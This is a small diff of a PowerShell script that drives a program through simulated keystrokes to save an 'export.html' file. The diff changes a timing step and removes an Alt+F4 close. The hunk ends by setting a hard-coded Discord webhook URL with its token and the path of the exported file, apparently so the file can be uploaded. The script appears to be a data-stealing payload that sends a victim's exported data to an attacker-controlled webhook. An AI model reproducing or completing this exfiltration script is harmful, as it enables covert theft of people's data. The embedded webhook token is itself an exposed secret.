@@ -47,8 +47,8 @@ Start-Sleep -Seconds 3
 [System.Windows.Forms.SendKeys]::SendWait('export.html')
 [System.Windows.Forms.SendKeys]::SendWait('{TAB}')
 [System.Windows.Forms.SendKeys]::SendWait('h')
-Start-Sleep -Seconds 1.7
-[System.Windows.Forms.SendKeys]::SendWait('%{F4}')  # ALT + F4
+
+Start-Sleep -Seconds 3
 
 $webhookUrl = 'https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX'
 $filePath = 'C:\temp\export.htm'
